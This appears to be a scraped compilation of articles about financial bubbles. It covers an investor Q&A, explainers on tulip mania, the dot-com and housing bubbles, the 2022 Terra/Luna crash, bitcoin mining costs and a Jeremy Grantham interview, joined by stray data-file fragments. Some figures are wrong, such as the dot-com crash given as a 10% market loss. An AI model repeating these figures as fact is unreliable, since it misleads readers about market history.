A: I got a lot of pushback. Waves of Bitcoin freaks attacked me in every way possible. They said my ears were too big, and that I needed to be locked up in an old-folks home.

Q: So if we were already in a bubble then, where do things stand right now?

A: Bubbles are unbelievably easy to see; it's knowing when the bust will come that is trickier. You see it when the markets are on the front pages instead of the financial pages, when the news is full of stories of people getting cheated, when new coins are being created every month. The scale of these things is so much bigger than in 1929 or in 2000.

Q: What is your take on equity valuations now?

A: Looking at most measures, the market is more expensive than in 2000, which was more expensive than anything that preceded it.

My favorite metric is price-to-sales: What you find is that even the cheapest parts of the market are way more expensive than in 2000.

Q: What might bring an end to this bubble?

A: Markets peak when you are as happy as you can get, and a near-perfect economy is extrapolated into the indefinite future. But around the corner are lurking serious issues like interest rates, inflation, labor and commodity prices. All of those are beginning to look less optimistic than they did just a week or two ago.

Q: How long until a bust?

A: A bust might take a few more months, and, in fact, I hope it does, because it will give us the opportunity to warn more people. The probabilities are that this will go into the fall: The stimulus, the economic recovery, and vaccinations have all allowed this thing to go on a few months longer than I would have initially guessed.

What pricks the bubble could be a virus problem, it could be an inflation problem, or it could be the most important category of all, which is everything else that is unexpected. One of 20 different things that you haven't even thought of will come out of the woodwork, and you had no idea it was even there.

Q: What might a bust look like?

A: There will be an enormous negative wealth effect, broader than it has ever been, compared to any other previous bubble breaking. It's the first time we have bubbled in so many different areas – interest rates, stocks, housing, non-energy commodities. On the way up, it gave us all a positive wealth effect, and on the way down it will retract, painfully.

Q: Are there any asset classes which are relatively attractive?

A: You could always own cash, or you could do what the institutions do, which is buy heavily into the asset classes that are least bad. The least overpriced are value stocks and emerging markets. Those are the two arbitrages. With value and emerging, you should make some positive return over the next 10 years.

Q: It is difficult to be bearish right now?

A: Not for me, because I don't have career risk anymore. But every big company has lots of risk: They facilitate a bubble until it bursts, and then they change their tune as fast as they can, and make money on the downside.

But this bubble is the real thing, and everyone can see it. It's as obvious as the nose on your face.

Would you ever pay Rs 1 lakh to buy one red rose? Absolutely not, because there is no fundamental use of this rose that justifies such a price. What if somebody is willing to buy it from you for Rs 2 lakh? Now, probably yes. But why would a person pay so much? Why not, if he/she is able to sell it for even much higher prices.



Now, what happens to rose prices if suddenly demand for it stops? Prices will tumble down and will probably drop close to zero. The same happened in the 17th century when Dutch investors purchased tulips, pushing their prices to unparalleled highs. The average price of a single tulip flower had surpassed the cost of purchasing some houses at the time before it eventually collapsed. This is known as Tulipmania. It reflects the cycle of a bubble. In the history of financial markets, many such bubbles are observed. For example, Japan’s asset bubble in the 1980s, the US tech bubble in the 1990s, the housing bubble in the2000s, etc.



Why do bubbles get formed?

Bubbles can be due to social, economic, and financial phenomena. It is caused by people’s desire for the experience of being part of something exciting, new, and trendy. This is supported by the availability of cheap money (excess liquidity, low-interest rates) and overall healthy economic conditions. Originally these bubbles start with some true fundamentals but eventually get over-extended and taken too far beyond a reasonable value. When valuation gets overstretched, investors start doubting the future prospect of the asset and start selling it. That is when the bubble starts bursting.



Sectoral bubble vs market bubble

When prices of particular or similar assets exceed their fundamental value by a large margin while other types of assets trade at a reasonable valuation, then it is a sectoral bubble. For example, crypto-bubble, commodity bubbles, etc. Similar observations can be made in a particular sector or a few sectors in the stock market at a time. Sectoral bubbles are more common. However, when the overall financial assets reach an inflated price (much higher than intrinsic worth) then it could be a sign of a market bubble. Market bubbles are more dangerous as all financial assets see massive sell-offs when the bubble bursts and investors lose money in all possible ways.



How to identify a possible bubble

Bubbles start forming when prices of a particular asset or assets exceed their long-term mean value without any significant fundamental changes in the underlying assets. If the prices exceed the historical highest value, then the bubble could be in its’ mature stage and ready to burst. However, investor’s euphoria could take the prices further up and make the bubble bigger when supported by high liquidity, favourable economic conditions, and excessive optimism.



How it impacts investor wealth

For any asset, prices should be supported by its fundamentals. Excessive rise in prices is likely to see a pullback when investors’ optimism reduces or economic conditions become tougher. When the bubble bursts, asset prices fall very sharply and suddenly. It creates a panic in financial markets. Everybody tries to come out of their long position and that causes the prices to fall further. Investors see a sudden and significant drop in their investment value. As financial markets are interconnected, a bubble in one asset class causes significant wealth destruction in other asset classes also. A bubble-burst could have a global impact as witnessed during the 2008 sub-prime crisis.



Amateur retail investors should learn more about financial markets’ bubbles before investing. They should be very cautious while investing in an asset with a continuous rise in prices. Excessive demand for a particular type of assets should be considered as a red flag. It is more important to protect existing wealth. Chasing high returns is more likely to destroy investors’ wealth.

A bubble is an economic cycle that is characterized by the rapid escalation of market value, particularly in the price of assets. This fast inflation is followed by a quick decrease in value, or a contraction, that is sometimes referred to as a ""crash"" or a ""bubble burst.""

Typically, a bubble is created by a surge in asset prices that is driven by exuberant market behavior. During a bubble, assets typically trade at a price, or within a price range, that greatly exceeds the asset's intrinsic value (the price does not align with the fundamentals of the asset).

The cause of bubbles is disputed by economists; some economists even disagree that bubbles occur at all (on the basis that asset prices frequently deviate from their intrinsic value). However, bubbles are usually only identified and studied in retrospect, after a massive drop in prices occurs.

How a Bubble Works

An economic bubble occurs any time that the price of a good rises far above the item's real value. Bubbles are typically attributed to a change in investor behavior, although what causes this change in behavior is debated.

Bubbles in equities markets and economies cause resources to be transferred to areas of rapid growth. At the end of a bubble, resources are moved again, causing prices to deflate.

The Japanese economy experienced a bubble in the 1980s after the country's banks were partially deregulated. This caused a huge surge in the prices of real estate and stock prices. The dot-com boom, also called the dot-com bubble, was a stock market bubble in the late 1990s. It was characterized by excessive speculation in Internet-related companies. During the dot-com boom, people bought technology stocks at high prices—believing they could sell them at a higher price—until confidence was lost and a large market correction occurred.

The research of American economist Hyman P. Minsky helps to explain the development of financial instability and provides one explanation of the characteristics of financial crises. Through his research, Minsky identified five stages in a typical credit cycle. While his theories went largely under-the-radar for many decades, the subprime mortgage crisis of 2008 renewed interest in his formulations, which also help to explain some of the patterns of a bubble.

Displacement

This stage takes place when investors start to notice a new paradigm, like a new product or technology, or historically low interest rates. This can be basically anything that gets their attention.

Boom

Prices start to rise. Then, they get even more momentum as more investors enter the market. This sets up the stage for the boom. There is an overall sense of failing to jump in, causing even more people to start buying assets.

Euphoria

When euphoria hits and asset prices skyrocket, it could be said that caution on the part of investors is mostly thrown out the window.

Profit-Taking

Figuring out when the bubble will burst isn’t easy; once a bubble has burst, it will not inflate again. But anyone who can identify the early warning signs will make money by selling off positions.

Panic

Asset prices change course and drop (sometimes as rapidly as they rose). Investors want to liquidate them at any price. Asset prices decline as supply outshines demand.

Examples of Bubbles

Recent history includes two very consequential bubbles: the dot-com bubble of the 1990s and the housing bubble between 2007 and 2008. However, the first recorded speculative bubble, which occurred in Holland from 1634 to 1637, provides an illustrative lesson that applies to the modern-day.

Tulip Mania

While it may seem absurd to suggest that a flower could bring down a whole economy, that is exactly what happened in Holland in the early 1600s. The tulip bulb trade initially started by accident. A botanist brought tulip bulbs from Constantinople and planted them for his own scientific research. Neighbors then stole the bulbs and began selling them. The wealthy began to collect some of the rarer varieties as a luxury good. As their demand increased, the prices of bulbs surged. Some rare varieties of tulips commanded astronomical prices.

Bulbs were traded for anything with a store of value, including homes and acreage. At its peak, tulip mania had created such a frenzy that fortunes were made overnight. The creation of a futures exchange, where tulips were bought and sold through contracts with no actual delivery, fueled the speculative pricing.

The bubble burst when a seller arranged a big purchase with a buyer, and the buyer failed to show. At this point, it was clear that price increases were unsustainable. This created a panic that spiraled throughout Europe, driving the worth of any tulip bulb down to a tiny fraction of its recent price. Dutch authorities stepped in to calm the panic by allowing contract holders to be freed from their contracts for 10% of the contract value. In the end, fortunes were lost by noblemen and laymen alike.

Dot-Com Bubble

The dot-com bubble was characterized by a rise in equity markets that was fueled by investments in internet and technology-based companies. It grew out of a combination of speculative investing and the overabundance of venture capital going into startup companies. Investors started to pour money into internet startups in the 1990s, with the express hope that they would be profitable.

As technology advanced and the internet started to be commercialized, startup companies in the Internet and technology sector helped fuel the surge in the stock market that began in 1995. The subsequent bubble was formed by cheap money and easy capital. Many of these companies barely generated any profits or even a significant product. Regardless, they were able to offer initial public offerings (IPOs). Their stock prices saw incredible highs, creating a frenzy among interested investors.

But as the market peaked, panic among investors ensued. This led to about a 10% loss in the stock market. The capital that was once easy to obtain started to dry up; companies with millions in market capitalization became worthless in a very short amount of time. As the year 2001 ended, a good portion of the public dot-com companies had folded.

U.S. Housing Bubble

The U.S. housing bubble was a real estate bubble that affected more than half of the United States in the mid-2000s. It was partially the result of the dot-com bubble. As the markets began to crash, values in real estate started to rise. At the same time, the demand for homeownership started to grow at almost alarming levels. Interest rates started to decline. A concurrent force was a lenient approach on the part of lenders; this meant that almost anyone could become a homeowner.

Banks reduced their requirements to borrow and started to lower their interest rates. Adjustable-rate mortgages (ARMs) became a favorite, with low introductory rates and refinancing options within three to five years. Many people started to buy homes, and some people flipped them for profits. But when the stock market began to rise again, interest rates also started to rise. For homeowners with ARMs, their mortgages started to refinance at higher rates. The value of these homes took a nosedive, which triggered a sell-off in mortgage-backed securities (MBSs). This eventually led to an environment that resulted in millions of dollars in mortgage defaults.",Asset Bubble Burst,2017-03-26 06:38:25

The cryptocurrencies have no underlying value, are not secured by any financial institution, and have no assets to claim the value.","The world of crypto is no stranger to volatility. The global crypto markets witnessed a brutal bloodbath losing almost $700 billion over the last one month. Bitcoin which is the poster boy of crypto markets has dropped below $30,000, down over 50 per cent from its peak in November 2021. The market capital of the global crypto has shrunk below 1.25 trillion in the last 24 hours, after touching 1.28 trillion a day before, a report in Financial Express said on May 21.

Over the last two weeks, smaller coins like Ether, Avalanche, and Solana have fallen too, but to everyone’s surprise, it was the Non-Fungible Tokens (NFTs) that took the biggest hit. The Bored Ape Yacht Club (BAYC) and many other such NFT collections saw their price plummeting 29 percent in the week ending on May 15 in dollar terms. The JPG NFT Index, which tracks NFTs, tumbled by about 26 percent during the same period.

What was the reason for the crash?

Cryptocurrencies had been launched with much fanfare and had seen the fastest growth among all asset classes in terms of attracting funds. They are, however, experiencing a massive sell-off faster than the run-up seen last year. Trading volumes in this asset class are also slowing down as evident from Coinbase’s recent quarterly results which were below market expectation on account of a nearly 20 percent drop in trading volumes.

Nasdaq has fallen by about 25 percent in 2022. Initially, the fall in crypto assets was brushed aside as one that is caused due to overall volatile financial markets. However, there seems to be a crisis building up.

Let us understand the real reason behind this free fall in crypto prices.

Cryptocurrencies as an asset class are highly prone to volatile prices. However, the main culprit behind last week’s crash was in fact not caused by this inherent volatility but due to stablecoins. This came about as quite a surprise as stablecoins, evident from their name, are usually considered to be a more stable and steadier entity among the otherwise volatile cryptocurrencies.

Why are stablecoins perceived as stable?

Stablecoins do not depend on market factors to ascertain their value. They are instead derived by pegging themselves to the value of a currency like the US dollar, or a commodity such as gold. This makes them less prone to the wild price swings that typically characterise the cryptomarket.

Stablecoins are of three main types:

Fiat-backed: These coins are backed by a national currency, that matches the fiat currency in reserve to the number of coins in circulation Cryptocurrency-backed: These are coins backed by another cryptocurrency (eg, BTC, ETH) and keep the cryptocurrency in reserve higher than the coins in circulation to account for the crypto’s volatility Algorithm-backed: These are coins that use an algorithm or “smart contract” to peg the stablecoin to another crypto token that helps ensure the stablecoin remains stable.

So, what made them so unstable?

Last week’s crash was led by the fall in the prices of stablecoins TerraUSD and TerraLUNA. TerraUSD is an algorithmic stablecoin that uses algorithms to maintain its stable value. TerraUSD does not have any physical reserves of dollars as collateral but instead depends on the cryptocurrency TerraLUNA to stabilise its market price. TerraUSD and TerraLuna have a 1:1 peg. This means that for every 1 TerraUSD sold, one TerraLUNA coin is minted and for every one TerraUSD purchased, one TerraLUNA is burnt or destroyed from the ecosystem.

This equilibrium broke last week due to de-pegging when digital coin TerraLUNA lost almost 100 per cent of its value and the Terra blockchain was suspended twice after its algorithm failed to rebalance. From its peak at $119, TerraLUNA is now valued near zero while the TerraUSD trades at 6 cents. Together these two knocked off about $300 billion last from the market cap of cryptocurrency. The damage grew further this week.

The issue with stablecoins is not limited to algorithm-backed ones, the fiat-backed coin, Tether which is backed by the US witnessed a fall in value in the week ending on May 15. However, after falling to 96 cents, it now stands at over 99 cents. Tether has $40 billion worth of holdings in the US Treasury bonds and refuses to reveal its holdings and any other details that will affect the integrity and mystery of the coin.

Will there be a repeat of the 2008 crisis?

Just as in 2008 certain structured credit products consisting of subprime mortgages were integrated into the financial systems to such an extent that when they collapsed, they triggered a financial crisis where the markets went into recession and millions of people lost their jobs and homes, the crypto assets if integrated, will have the same capacity.

Stablecoins currently have a total market cap of around $170 billion, while the total crypto market is estimated to be around $1.2 trillion. Even though stable coins are too small currently to affect the economy at large, but cryptocurrencies have started working their way into the financial systems, it is now found in the portfolio of many traditional investors as well.

Some public companies now have crypto exposure, some finance companies have now started issuing loans with NFTs as collateral and now these NFT-backed loans are under pressure and are seeing sell downs to settle loan obligations.

In the future, upon further integration, a slide in the value of crypto assets and NFTs may thus impact the broader financial markets along with it.

A bubble could be healthy

This crypto crash is a grim reminder of the dot-com bubble that led to the 2000 crash in technology companies or the housing bubble that led to the Great Recession in 2008-2009. In both these cases, a sharp rise in speculative prices over several years was followed by a sharp panic-fueled sell-off.

The previous bubbles were highly destructive, wiping out trillions of wealth from economies. This crypto bubble could, however, be beneficial, only if it pops and pops soon. While any bubble burst could lead to several crypto coins getting totally wiped out, the bankruptcy of companies and losses to investors, it could however trigger the much-needed protection.

This crash has put cryptocurrencies and stablecoins on the radar, yet again. This could entail stronger regulations and reset the expectations from this asset class.

Should you buy the dip?

About 20 million Indians have invested in cryptocurrency in India with multiple startups and crypto wallets coming up to cash in on the opportunity of unregulated gains. The Indian crypto exchanges are now in a tough spot after the delisting of the TerraLUNA on platforms like CoinDCX and WazirX.

India in its budget this year said that it will be introducing its very own cryptocurrency and had introduced a 30 percent flat tax on all gains from virtual digital assets including crypto and the upcoming one percent TDS (tax deducted at source) for all transactions.

The Indian government is also mulling imposing a GST on all crypto transactions at 28 percent, the highest tax bracket putting them at par with gambling and betting.

One must understand that cryptocurrencies are an extremely risky asset class. The current regulatory uncertainty in India makes them an even more risky bet. The chances of your crypto investments wiping out completely have become more real than ever.

The future of cryptocurrencies is still uncertain. The cryptocurrencies have no underlying value, are not secured by any financial institution, and have no assets to claim the value. The price of such cryptos is based on demand and supply factors.

What we suggest to investors is to not take any new positions in cryptocurrencies until there is a framework in place to manage the asset. Putting money in cryptos is a risky venture as the valuation is unknown, the owners are unknown and they are still not widely accepted across the globe as a payment option.

The future is still unknown and uncertain, and investors should stay away from high-risk assets to their capital intact. Although cryptos have provided multi-bagger gains in the past, there is nothing that can stop their value from going to zero.",Asset Bubble Burst,2022-05-21 07:00:00

The California gold rush of 1848-55, for example, brought 300,000 hopefuls to the Sierra Nevada and northern California and involved the massacre of thousands of Indigenous people.

In our day, the new gold is bitcoin, a cryptocurrency, and prospecting for it has become a genteel armchair activity, although it is called “mining”, for old times’ sake. What it actually involves is using computers to perform unfathomably complicated calculations to create cryptographic “hashes” – codes that are, in practical terms, uncrackable.

Sounds intimidating, doesn’t it? But in reality anyone can play the game. You just have to have the right kit – a special bitcoin-mining computer called an Asic (application-specific integrated circuit). These gizmos are readily available online. I’m looking at one as I write: the Bitmain Antminer S19, which costs $6,999 (£5,600) and can do 95 terahashes – 95tn calculations – every second.

Mining is a misleading term for the computational work that’s needed to validate transactions on the blockchain – the cryptographically protected distributed ledger that underpins bitcoin. For every “block” that a miner is able to validate, they are rewarded with a number (currently 6.3) of new bitcoins. The value of the reward is tied to the prevailing price of the currency at the time. Not so long ago, for example, when each bitcoin stood at $68,000, that reward was worth nearly $430,000.

So you can understand why bitcoin mining looks a bit like a contemporary version of what happened in California in the 1840s. While most of the hopeful arrivals then were Americans, there were also thousands from Latin America, Europe, Australia and China. The Judge Business School in Cambridge, which has been tracking bitcoin mining for years, now finds that the US, with 37.84% of global hashrates, remains the biggest location, followed by China (21.11%), Kazakhstan (13.22%), Canada (6.48%) and Russia (4.66%).

So bitcoin mining has become a global phenomenon. And while here and there there are small outfits diversifying into it, such as the Californian pancake-batter maker that bought an Asic after pancake sales plunged during the pandemic, most miners are now industrial-scale operations with large sheds of Asics in serried racks, looking for all the world like small-scale data centres of the kind run by Google and co.

And, like data centres, they are power-hungry. That Bitmain Antminer machine, for example, has a power rating of 3,250 watts. It was recently estimated that bitcoin consumes about 110 terawatt hours per year, which is 0.55% of global electricity production, or roughly equivalent to the annual energy draw of countries such Malaysia or Sweden.

Bitcoin has been a fascinating phenomenon from the beginning, but one that morphed under the pressure of greed

For many operators, bitcoin mining has up to now been an astonishingly lucrative activity, with gross margins sometimes as high as 90%. But suddenly things have changed. First, bitcoin’s price has plunged – from its peak of $68,000 to $30,587 as I write this. And second, electricity prices have soared – by up to 70% in parts of the world, leading some industry experts to calculate that mining a single bitcoin can now cost up to $25,000. So the industry finds itself squeezed at both ends. Just like any ordinary business, in other words.

There’s an agreeable sense of schadenfreude in all this. Bitcoin has been a fascinating phenomenon from the very beginning, but one that morphed under the pressure of greed. Originally conceived as a currency – that is, as a means of payment – it rapidly became perceived as an asset class and, in a time of low interest rates, was the subject of an hysterical speculative bubble that now seems to have deflated, even if it hasn’t definitively burst.

Although it was predictable from the outset that, as the currency evolved, maintenance of its underpinning cryptographic blockchain would become ever-more onerous, it took a long time for the environmental consequences of that fact to be realised. But perhaps that’s a hallmark of every speculative bubble. It’s always difficult to get people to understand something if their wealth – real or anticipated – depends on their not understanding it. Meanwhile, the rest of us are left with the realisation that even the coolest idea can fry the planet.

So, they believe that you should bail out any stock market decline, but a bubble should be ignored.","In a wide-ranging and timely conversation, Jeremy Grantham joined Morningstar’s Christine Benz and Jeff Ptak on The Long View podcast, discussing everything from meme stocks to the housing market to the potential bursting of the stock market “super bubble.”



Grantham, the long-term investment strategist at his namesake firm that he co-founded, Grantham, Mayo, Van Otterloo & Co., spoke at length about what we’ve learned, and what has changed, since 2008, taking into account new strains for investors that rose alongside the pandemic.



Grantham offers a strong warning: The bursting of the U.S. stock market ""super bubble"" could be more devastating than investors are prepared for. Here are our six takeaways on how not to repeat history and potentially sidestep the market crash.

Grantham: About 25 years ago, we felt in order to talk about bubbles, we should probably define them statistically. And so, we did just that. And we picked a standard statistical term of a 2-sigma. A 2-sigma event is the kind that should occur every 44 years in a perfectly random world. And with human beings who are capable of being a little inefficient, they occur every 35 years in the equity markets, close enough, I would say, for government work. And we noticed that all of them in the developed world in modern times in equity markets went back to the trend. And the trend is easy to measure. The 2-sigma is pretty straightforward statistics. And the fact that all of them went back without exception, we find a very compelling idea.



The complexity comes from the fact that some of these 2-sigma events continue to go up. And the three of them in the U.S. have gone up to 3-sigma, which is the kind that you would expect every 100 years, but as I like to say, humans do seriously crazy pretty well. So, they are much further away from random than 2-sigma. And two out of three, certainly more than half of 2-sigma go on to 3-sigma in recent times. And the 3-sigma events, we have 1929, 2000 and today, in the equity market, and Japan as a major market overseas in 1989. And it doesn't change the outcome. You go back to trend. But since by definition, you've gone further up, it takes longer and more painful and more pain to come down. And the quicker the bubbles end, the better off everybody is. And we mentioned this one as a 2-sigma back in July of 2020 or August about 3,500. The trendline is about 2,500. 2-sigma is about 3,500 and 3-sigma is 4,500, 4,600. We got to 4,800 in December. And if you're going to have a bubble, it's better to break from 3,500 to 2,500 than it is to break from 4,800 to 2,500. And therefore, the real McCoy super bubbles are extremely painful in terms of a reduction of perceived wealth. And there is a wealth effect. When they mark down your portfolio or your house, you spend a little less the following year or two.

Grantham: Well, seven years ago, the market was above its long-term trend in terms of value, and they went a whole lot higher. So, any value-based forecast won't even get the sign right. If you want to be friendly to our public forecast, you could take the 10-year forecast, which is what we used to use in 2000, where we suggested that emerging would make money and the S&P would lose a lot of money in the following 10 years. And 10 years later, the S&P had lost a lot of money and emerging had made a lot of money. Even though they were technically highly correlated, the sheer difference in value had generated enormous difference in outcomes. And the reason we looked good was because 10 years later, the market was at fair value, or for a second or two in 2009, it was actually decently cheap for six months, even on long-term value.



The point is, if we measure at fair value or below, our forecast for the prior 10 years or seven years look brilliant. If you measure at a market peak, our forecast for the prior seven years or 10 years look terrible. It's pretty straightforward. And we're selling at twice fair value. As you know, we're selling on Warren Buffett's measure GDP to the stock market at the highest ratios ever, much higher than 2000, the previous record holder. On smoothed average of earnings, we're very similar to 2000, and that's because the last 20 years have been abnormally profitable. That in turn may be mean reverting. I believe it will be. We'll see. But for 20 years, the profit margins as a percentage of GDP, total profits have been higher and profit margins have been higher. And so, the Shiller P/E is perhaps a little overfriendly to the market. So, we look a little less overpriced than 2000. If you look at price to sales, every single decile of price to sales is above the 2000 previous world record. The least above is the highest-priced, the top 10% on price to sales, only just late last year went ahead of the top 10% in 2000. The bottom 10%, however, is way over where the bottom 10% was in 2000. And every single decile in between is – so, every decile by price to sales is more overpriced than it was the top of the market in 2000. So, this is very broad overpricing. So, there's no real measure of value, long-term value, that you could find where this isn't one of the most overpriced markets we have ever seen.

Grantham: I've tended to say we have 3.5 bubbles. Commodities are a little bit different. I don't fear them because we're going to lose income or assets when the prices of commodities go down. Ordinary people don't earn big positions in copper and oil in the futures market. What I worry about is the income effect. If the price of oil goes to $120, which it may well, and the price of metals keep on going up, and the price of food keeps on going up, it simply squeezes your income. There is less leftover to do everything else. And in that sense, you're poorer for dealing with the rest of the world. And that's (indiscernible) effect. If that coincides with the wealth effect from the stock market imploding, you have a double whammy, which you had in the housing bust. Housing came down, and in a sense, it took the stock market along for the ride. The S&P went down 50%. And there was a very handsome negative income effect. At the same time, your house was going down, and your confidence level was falling. That double whammy, which they had in Japan for 20 years really, we also had in the U.S., and it was much more painful and guaranteed a much tougher economic environment than we had had for quite a few decades. So, you don't want to do that.



And you're playing with fire if you combine the lowest interest rates and the highest bond prices in history with the highest stock market in history and the highest multiple of family income in housing. I'm not saying that they will all go together. There are reasons as you suggest that the housing market may unravel more slowly. It will be more a slow steady function of interest rates. And nevertheless, we're playing with fire by having all of those things overpriced at the same time. We're running the risk that we will be squeezed by high energy and commodity prices, because we're squeezed from the loss of perceived value in our housing and the stock market.

Meme Stocks: Who is driving equity market overvaluation?

Grantham: Corporate buybacks have been the shining number one driver of this 11-year bull market and has changed everything. And then, with the stimulus program, of course, the individuals came back quite suddenly, and in many cases, unexpectedly, not just unexpectedly in the numbers and the amount, but in their style. The meme stock style of investing is something no one has ever seen before happily. Hopefully, we'll never see it again. But it did take basically worthless stocks like GameStop up 110 times in a month and 40, 50 times for AMC, the movie chain. These are levels of craziness that we had not seen in 1929 and even in the Pets.com era. In my opinion, they there was more money involved, bigger moves involved than we had ever seen.



But to get back to your point – so, individuals came storming in at the end, buying their own stocks by hand, not moving into institutional-type mutual funds. And the whole time, corporations were buying their stock back. Why wouldn't they? It's a safer way to invest their cash flow than developing new ideas of their own. And they would rather go out and buy a company from the venture capital industry as a capital transaction. Why would they risk income transactions by developing their own new ideas? So, they're basically outsourcing to the venture capital industry. And that's the same kind of attitude that is represented by buying your stock back. You know exactly what you're getting, you know what it costs, you know what the effect is. You get rid of the weak holders of the stock, and it helps push the price of the stock up. The fact that it should not in an efficient world is irrelevant. In the real world, you get rid of weak holders, and steady buying pressure on stocks pushes the price earnings ratio up, and their stock options benefit. 85% of the remuneration comes from direct stock grants and from stock options. Why would they not put management of the share price as a top priority? I avoided the word manipulation, but I was very tempted to use it.

Grantham: Value is pretty darn cheap compared to growth. And the U.S. is about as expensive as it gets compared to other developed countries. So, non-U.S. equities are oddly semi reasonable. They're overpriced, but they're not too bad. And one or two of them, like Japan, the U.K., are really not materially overpriced even, which is unusual. With the U.S. not unique incidentally – 2000 was rather like that – but it's unusual to have such a big disparity between one euphoric market and the rest of the world being relatively serious and more ordinary looking. Emerging, obviously, has some problems or question marks with China, but emerging in total looks very much cheaper than the U.S., about half price. And the value component is cheap within emerging. So, value stocks outside the U.S. are not too bad. And you can expect, if you put them away for 10 years, to make a respectable – even if it's sub-average, you should make a respectable return. The U.S., I suspect you'll make no money at all for 10 years. And you have to find the kind of moral equivalent in fixed income, other ways of investing your money. And I am not the person to talk to about the broad asset allocation portfolios. I have not been doing that for well over a decade.

Who is to blame?

Grantham: Well, I would say, if anything looks alive and well about market inefficiency, it's the macro level of the market. Because we are meant to have a 3-sigma bubble every 100 years in an efficient market that occasionally by sheer randomness wanders off to 3-sigma. And we had one in 2000, and we had a 3-sigma housing bubble in 2007, and we have a 3-sigma equity bubble again. Now, this is abnormally calm. And a 3-sigma event is a major, major event, but the stock markets are at least (indiscernible). And then, you go under trend in the right conditions. All the great bubbles used to go under trend until the Greenspan era. Greenspan made moral hazards such a pronounced feature of Fed management that he has somewhat changed the dynamics and his successors completely followed that policy. So, they believe that you should bail out any stock market decline, but a bubble should be ignored. And in fact, they, from time to time, all for them, have expressed doubt as to whether bubbles actually exist as a phenomenon.



So, markets break, they come and help you; markets bubble, they ignore it, and you're on your own. It's a wonderful asymmetrical moral hazard, and it results in the formation, not an accident at all, of these three great 2-sigma events in 25 years. And the first one, the 2000 tech bubble burst with wretched effect. And then, we had a nasty recession, the housing and the stock market go in 2008, which was twice as bad and would have been a depression for not just the Fed, but for massive then unprecedented government stimulus. And here we are in the third one. These are dangerous things. I don't know what the Fed thinks it's doing. Well, I actually know what the Fed thinks it's doing. The Fed does not worry its pretty little head about the downside of asset bubbles breaking or the risk involved in asset bubbles forming. It spends its time worrying about other things. And we pay a very high price for an unstable asset system and an occasionally destabilized economy.

The stock market bubble of the 1920s, the dot-com bubble of the 1990s, and the real estate bubble of the 2000s were asset bubbles followed by sharp economic downturns. Asset bubbles are especially devastating for individuals and businesses who invest too late, meaning shortly before the bubble bursts. In this regard, asset price bubbles bear a similarity to Ponzi or pyramid scams. The inevitable collapse of asset bubbles wipes out net worth of investors and causes exposed businesses to fail, potentially touching off a cascade of debt deflation and financial panic that can spread to other parts of the economy resulting in a period of higher unemployment and lower production that characterizes a recession.

Key Takeaways Asset bubbles exist when market prices in some sector increase over time and trade far higher than fundamentals would suggest.

Expansion of the supply of money and credit in an economy provides the necessary fuel for bubbles.

Technological factors, incentives created by public policies, and the particular historical circumstances around a given bubble help to determine which asset classes and industries are the focus of a bubble.

Market psychology and emotions like greed and herding instincts are thought to magnify the bubble further.

When bubbles eventually pop, they tend to leave economic pain in their wake including recession or even depression.

How Asset Bubbles Can Lead to Recession

An asset bubble occurs when the price of an asset, such as stocks, bonds, real estate, or commodities, rises at a rapid pace without underlying fundamentals, such as equally fast-rising demand, to justify the price spike.

It is normal to see prices rise and fall over time as buyers and sellers discover and move toward equilibrium in a series of successive trades over time. It is normal to see prices overshoot (and undershoot) the prices implied by fundamentals of supply and demand as this process proceeds, and this can be and has been readily demonstrated by economists in controlled experiments and classroom exercises.

Price Discovery Prices normally rise and fall in any market, but they tend toward the fundamental value of the traded goods or assets over time.

In actual markets, prices may in fact always be either above or below the implicit equilibrium price at any given point in time as the fundamentals of supply and demand themselves change over time while the price discovery process is simultaneously in motion. However there is always a tendency for prices to seek or move toward the implicit equilibrium price over time as market participants gain experience and information about market fundamentals and the past series of prices.

What makes a bubble different is that the prices for a given class of assets or goods overshoots the implied market equilibrium price and remains persistently high and even continues to climb rather than correcting toward the expected equilibrium prices. This happens because of an increase in the supply of money and credit flowing into that market, which gives buyers the ability to continue to bid prices higher and higher.

Asset Price Bubbles In an asset price bubble, new money entering the market keeps prices going up well beyond the fundamental value of the underlying assets implied by simple supply and demand.

When a central bank or other monetary authority expands the supply of money and credit in an economy, the new units of money always enter the economy at a specific point in time and into the hands of specific market participants, and then spreads out gradually as the new money changes hands in successive transactions. Over time this causes most or all prices to adjust upward, in the familiar process of price inflation, but this does not happen instantaneously to all prices.

Early recipients of the new money are thus able to bid up prices for the assets and goods that they purchase before prices in the rest of the economy rise. This is part of the economic phenomenon known as a Cantillon Effect. When buying activity in the market is focused on a specific asset class of assets or economic goods by the circumstances of the time, then the relative prices of those assets rise compared to other goods in the economy. This is what produces an asset price bubble. The prices of these assets no longer reflect just the real conditions of supply and demand relative to all other goods in the economy, but are driven higher by the Cantillon Effect of the new money entering the economy.

Richard Cantillon Richard Cantillon was an 18th century economist and investor who participated in and later wrote about asset price bubbles and the effects of monetary expansion.

Like a snowball, an asset bubble feeds on itself. When an asset price begins rising at a rate appreciably higher than the broader market, opportunistic investors and speculators jump in and bid the price up even more. This leads to further speculation and further price increases not supported by market fundamentals. The expectation of future price appreciation in the bubble assets itself drives buyers to bid prices higher. The resulting flood of investment dollars into the asset pushes the price up to even more inflated levels.

The real trouble starts when the asset bubble picks up so much speed that everyday people, effectively the last recipients of the newly created money as it trickles down through to their wages and business income, many of whom have little-to-no investing experience, take notice and decide they too can profit from rising prices. At this point prices throughout the economy have already begun to rise, as the new money has spread through the economy to reach the pockets of these everyday people. Because it is now circulating throughout the economy, the new money no longer has the power to continue pushing the relative prices of the bubble assets up compared to other goods and assets.

Early recipients of the new money sell to the latecomers, realizing outsized profits. These late buyers however realize little or no gains as the price bubble stalls for want of new money. The price bubble is no longer sustainable without additional injections of new money (or credit) by the central bank or monetary authority.

The bubble then begins to deflate. Other prices in the economy are rising to normalize the relative prices of the bubble assets, dampening and no new money is entering the economy to fuel more bubble price rise, both of which also dampen expectations of future bubble price appreciation. Late buyers are disappointed by lackluster gains and the speculative optimism that magnified the bubble‘s rise now reverses. Bubble prices begin to fall back toward those implied by market fundamentals.

The central bank or other monetary authority may at this point try to continue inflating the bubble by injecting more new money, and repeat the above described process, or after a sustained period of monetary injections and bubble inflation it may cut back on injecting new money to tamp down consumer price and wage inflation. Sometimes a real economic shock, such as a spike in oil prices, helps trigger a cut back in monetary injections.

When the flow of new money stops, or even slows substantially, this can cause the asset bubble to burst. This sends prices falling precipitously and wreaks havoc for latecomers to the game, most of whom lose a large percentage of their investments. The bursting of the bubble is also the final realization of the Cantillon Effect, as not just a change in relative prices on paper during the rise of the bubble, but a large scale transfer of real wealth and income from the late comers to the early recipients of the newly created money who started the bubble.

